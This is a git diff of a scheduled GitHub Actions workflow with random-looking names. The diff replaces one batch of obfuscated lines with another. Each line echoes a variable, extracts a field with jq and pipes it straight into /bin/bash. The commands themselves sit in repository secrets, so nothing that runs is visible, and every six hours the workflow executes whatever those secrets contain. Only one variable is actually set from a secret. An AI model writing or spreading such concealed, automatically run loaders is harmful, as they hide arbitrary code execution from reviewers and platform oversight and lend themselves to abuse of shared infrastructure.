@@ -3,30 +3,22 @@ name: huanglongxing1987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 3/6 * * *'
-
+    - cron: '54 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huanglongxing1987
         env:
-          cq2141: ${{ secrets.cq2141 }}
+          zex662: ${{ secrets.zex662 }}
         run: |
-          echo $cq2141 | jq -r .ovsgd365 | /bin/bash
-          echo $u02 | jq -r .vq018 | /bin/bash
-          echo $amum26 | jq -r .dpje0271 | /bin/bash
-          echo $pibgp553 | jq -r .jfie0 | /bin/bash
-          echo $mqs03907 | jq -r .okrxq50 | /bin/bash
-          echo $vzjw6 | jq -r .mbkr6053 | /bin/bash
-          echo $w68 | jq -r .xhb970 | /bin/bash
-          echo $l7929 | jq -r .frw3 | /bin/bash
-          echo $byw674 | jq -r .mcir76 | /bin/bash
-          echo $matvk90 | jq -r .kpys99 | /bin/bash
-          echo $sht73893 | jq -r .z1966 | /bin/bash
-          echo $mm6 | jq -r .wka3 | /bin/bash
-          echo $ivjql3 | jq -r .z0806 | /bin/bash
-          echo $zjlsj8 | jq -r .nj072 | /bin/bash
+          echo $zex662 | jq -r .i413 | /bin/bash
+          echo $y48061 | jq -r .vk9 | /bin/bash
+          echo $om9 | jq -r .cqles810 | /bin/bash
+          echo $oitnv27228 | jq -r .tbbm67 | /bin/bash
+          echo $ivr92364 | jq -r .spbz34032 | /bin/bash
+          echo $nzs15 | jq -r .kc059 | /bin/bash
+          echo $bnq39 | jq -r .wifkr51 | /bin/bash
+          echo $hcs3766 | jq -r .mb4 | /bin/bash
 
